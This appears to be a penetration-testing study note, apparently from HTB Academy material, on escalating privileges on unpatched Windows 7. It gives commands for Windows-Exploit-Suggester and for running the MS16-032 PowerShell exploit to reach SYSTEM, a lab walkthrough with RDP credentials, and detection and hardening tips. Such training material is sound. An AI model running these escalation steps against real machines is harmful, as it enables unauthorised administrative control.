# Windows 7 Exploitation

## üéØ Overview

**Windows 7** reached **end-of-life January 14, 2020** but remains widely deployed with **100+ million users**. Common in **education**, **retail**, **healthcare**, **government**, and **manufacturing** sectors. Legacy desktop systems lack modern security features and present significant **privilege escalation opportunities**.

## üìä Security Feature Comparison

### Windows 7 vs Windows 10
```cmd
Feature                    | Windows 7 | Windows 10
---------------------------|-----------|------------
Microsoft Password (MFA)   |     ‚ùå    |     ‚úÖ
BitLocker                  |  Partial  |     ‚úÖ  
Credential Guard           |     ‚ùå    |     ‚úÖ
Remote Credential Guard    |     ‚ùå    |     ‚úÖ
Device Guard               |     ‚ùå    |     ‚úÖ
AppLocker                  |  Partial  |     ‚úÖ
Windows Defender           |  Partial  |     ‚úÖ
Control Flow Guard         |     ‚ùå    |     ‚úÖ

# Result: Windows 7 lacks critical modern security protections
```

## üîç Windows-Exploit-Suggester

### Tool Setup (Attack Machine)
```bash
# Download tool:
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

# Install dependencies (if needed):
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz && cd setuptools-2.0/ && sudo python2.7 setup.py install

sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz && cd xlrd-1.0.0/ && sudo python2.7 setup.py install

# Update vulnerability database:
python2.7 windows-exploit-suggester.py --update
```

### System Information Gathering
```cmd
# On target system - gather systeminfo:
systeminfo

# Example Windows 7 output:
Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB2999226  
                           [03]: KB976902

# Save output to file: systeminfo.txt
```

### Vulnerability Analysis
```bash
# Run exploit suggester:
python2.7 windows-exploit-suggester.py --database 2022-11-22-mssb.xls --systeminfo systeminfo.txt

# Common Windows 7 vulnerabilities:
[E] MS16-135: win32k Denial of Service
[E] MS16-098: RGNOBJ Integer Overflow  
[M] MS16-075: SMB Server (RottenPotato/HotPotato)
[E] MS16-032: Secondary Logon Handle - Important ‚≠ê
[M] MS14-012: Internet Explorer
[E] MS13-101: Windows Kernel-Mode Drivers

# Key: [E] = ExploitDB PoC, [M] = Metasploit module
```

## üöÄ MS16-032 Privilege Escalation

### Vulnerability Details
```cmd
# CVE-2016-0099: Secondary Logon Service
- Affects Windows 7-10 & Server 2008-2012
- Privilege escalation through token impersonation
- PowerShell PoC available
- Reliable exploitation method
```

### PowerShell Exploit Execution
```powershell
# Set execution policy:
Set-ExecutionPolicy bypass -scope process
# Choose: Y (Yes)

# Import and execute MS16-032:
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032

# Exploit output:
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[*] Sniffing out privileged impersonation token..
[?] Thread belongs to: svchost
[>] Building SYSTEM impersonation token
[!] Holy handle leak Batman, we have a SYSTEM shell!!

# Result: NT AUTHORITY\SYSTEM cmd console spawned
```

## üéØ HTB Academy Lab Walkthrough

### Lab Environment
```cmd
# Access: RDP with htb-student:HTB_@cademy_stdnt!
# Target: Windows 7 Professional SP1
# Objective: Get Administrator flag.txt
```

### Complete Step-by-Step Solution

#### 1. Initial Access
```bash
# Connect via RDP:
xfreerdp /v:<target_ip> /u:htb-student /p:HTB_@cademy_stdnt!
```

#### 2. System Enumeration
```powershell
# Open PowerShell and gather system info:
systeminfo

# Key details:
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
Hotfix(s): 3 Hotfix(s) Installed (minimal patches)
```

#### 3. Vulnerability Assessment (Attack Machine)
```bash
# Save systeminfo output to file: systeminfo.txt

# Download Windows-Exploit-Suggester:
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

# Update vulnerability database:
python2.7 windows-exploit-suggester.py --update

# Run analysis:
python2.7 windows-exploit-suggester.py --database 2022-11-22-mssb.xls --systeminfo systeminfo.txt

# Key finding: MS16-032 - Secondary Logon Handle - Important
```

#### 4. Privilege Escalation (Target Machine)
```powershell
# Navigate to tools directory:
cd C:\Tools

# Set PowerShell execution policy:
Set-ExecutionPolicy bypass -scope process
# Choose: Y

# Import and execute MS16-032 exploit:
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032

# Result: SYSTEM cmd console opens automatically
```

#### 5. Flag Retrieval
```cmd
# In the new SYSTEM cmd console:
whoami
# Output: nt authority\system

# Get Administrator flag:
type C:\Users\Administrator\Desktop\flag.txt

# Expected result: Flag content displayed
```

## üîÑ Alternative Exploitation Methods

### Sherlock Alternative
```powershell
# Use Sherlock instead of Windows-Exploit-Suggester:
Import-Module .\Sherlock.ps1
Find-AllVulns

# Common Windows 7 findings:
MS16-032 - Secondary Logon Handle - Appears Vulnerable
MS15-051 - ClientCopyImage Win32k - Appears Vulnerable
MS14-058 - TrackPopupMenu Win32k - Not Vulnerable
```

### Manual Exploit Compilation
```cmd
# Download standalone exploits from exploit-db:
# MS16-032: https://www.exploit-db.com/exploits/39719/
# MS15-051: https://www.exploit-db.com/exploits/37367/

# Compile and execute:
# .\ms16-032.exe
# .\ms15-051.exe "cmd.exe"
```

## üè¢ Business Context Considerations

### Legacy System Scenarios
```cmd
# Common Windows 7 use cases:
- Point of Sale (POS) systems in retail
- Medical equipment control systems  
- Manufacturing floor computers
- Legacy application dependencies
- Embedded systems in transportation
- Government workstations
- Educational institution labs
```

### Risk Assessment Factors
```cmd
# Consider before recommending upgrade:
- Financial impact of immediate replacement
- Business continuity requirements
- Regulatory compliance needs
- Vendor support availability
- Network isolation capabilities
- Compensating security controls
```

## ‚ö†Ô∏è Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Windows-Exploit-Suggester execution
- MS16-032 PowerShell script usage
- Secondary Logon Service exploitation
- Unusual token impersonation activities
- SYSTEM process spawning from user context
- PowerShell execution policy changes
```

### Defensive Measures
```cmd
# Windows 7 hardening:
- Apply all available security patches
- Implement network segmentation
- Deploy advanced endpoint protection
- Monitor PowerShell execution
- Restrict administrative privileges
- Regular vulnerability assessments
- Plan migration to supported OS
```

## üí° Key Takeaways

1. **Windows 7** widely deployed despite EOL status
2. **Windows-Exploit-Suggester** provides comprehensive vulnerability assessment
3. **MS16-032** reliable privilege escalation for Windows 7 systems
4. **PowerShell exploits** often more effective than compiled binaries
5. **Business context** critical for remediation recommendations
6. **Multiple CVEs** available on unpatched Windows 7 systems
7. **Network segmentation** essential for legacy system protection

---

*Windows 7 systems represent significant security risks due to end-of-life status and missing modern protections, requiring careful business-context assessment for remediation planning.* 